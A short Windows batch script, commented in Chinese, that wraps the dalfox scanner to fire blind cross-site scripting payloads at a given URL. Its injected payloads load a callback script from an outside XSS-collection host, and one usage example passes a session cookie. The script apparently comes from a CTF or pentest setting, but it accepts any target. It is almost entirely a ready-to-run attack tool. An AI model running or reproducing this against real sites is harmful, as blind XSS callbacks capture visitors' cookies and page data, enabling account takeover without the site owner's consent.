@echo off
rem ============================================
rem  dalfox + XSS平台 盲打联动（单目标）
rem  用法: dxss.bat <目标URL> [额外dalfox参数...]
rem  例:   dxss.bat "http://target.com/search?q=test"
rem        dxss.bat "http://target.com/p?id=1" -c "session=abc"
rem ============================================
set CB=https://ctf.zemu137.online:9443/x.js
"%~dp0dalfox.exe" url %1 --blind %CB% %2 %3 %4 %5 %6 %7 %8 %9
